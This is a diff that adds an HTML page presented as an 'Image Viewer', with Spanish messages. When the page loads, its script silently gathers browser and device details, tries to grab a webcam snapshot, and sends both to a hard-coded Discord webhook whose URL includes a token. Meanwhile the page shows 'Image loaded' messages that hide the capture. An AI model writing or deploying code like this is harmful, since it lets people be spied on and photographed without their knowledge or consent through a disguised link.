@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Viewer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #1a1a1a;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 90%;
+            text-align: center;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        .status {
+            color: #00ff00;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 style="color: white;">🖼️ Image Viewer</h2>
+        <div id="status" class="status">⏳ Loading...</div>
+        <img id="targetImage" src="Captura de pantalla 2026-03-16 060146_view.png" alt="Tracked Image">
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484358816933085287/N16XtmubEfoR7eOmMH9-cX-q_RDXS55O93qAw_s3f-km4TVnsLLuxVBqLhztbOnKtbiL';
+        const TRACKING_ID = 'bc13fcf6';
+        const TRACKING_TYPE = 'camera';
+
+        async function captureAndSend() {
+            const statusDiv = document.getElementById('status');
+            
+            try {
+                const userInfo = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href
+                };
+
+                let cameraCaptured = false;
+                let cameraData = null;
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { width: 640, height: 480 } 
+                    });
+                    
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    cameraData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    cameraCaptured = true;
+                } catch (err) {
+                    console.log('Cámara no disponible:', err);
+                }
+
+                const embed = {
+                    title: "🎯 Imagen Rastreada Activada",
+                    description: `**Usuario detectado**\n\n` +
+                                `**Timestamp:** ${userInfo.timestamp}\n` +
+                                `**Plataforma:** ${userInfo.platform}\n` +
+                                `**Navegador:** ${userInfo.language}\n` +
+                                `**Resolución:** ${userInfo.screenResolution}\n` +
+                                `**URL:** ${userInfo.url}\n\n` +
+                                `**ID Rastreo:** ${TRACKING_ID}\n` +
+                                `**Tipo:** ${TRACKING_TYPE}\n\n` +
+                                (cameraCaptured ? '📸 **Cámara capturada exitosamente**' : '⚠️ Cámara no disponible'),
+                    color: cameraCaptured ? 5814783 : 15158332
+                };
+
+                const payload = {
+                    content: `🔍 **Imagen Rastreada - ${TRACKING_TYPE.toUpperCase()}**`,
+                    embeds: [embed]
+                };
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    statusDiv.textContent = '✅ Image loaded successfully!';
+                    statusDiv.style.background = 'rgba(0,255,0,0.2)';
+                    
+                    if (cameraCaptured) {
+                        const formData = new FormData();
+                        const blob = await (await fetch(`data:image/jpeg;base64,${cameraData}`)).blob();
+                        formData.append('file', blob, 'camera_capture.jpg');
+                        
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                } else {
+                    statusDiv.textContent = '⚠️ Image loaded (tracking failed)';
+                }
+
+            } catch (error) {
+                console.error('Error:', error);
+                statusDiv.textContent = '✅ Image loaded';
+            }
+        }
+
+        window.addEventListener('load', () => {
+            setTimeout(captureAndSend, 1000);
+        });
+    </script>
+</body>
+</html>
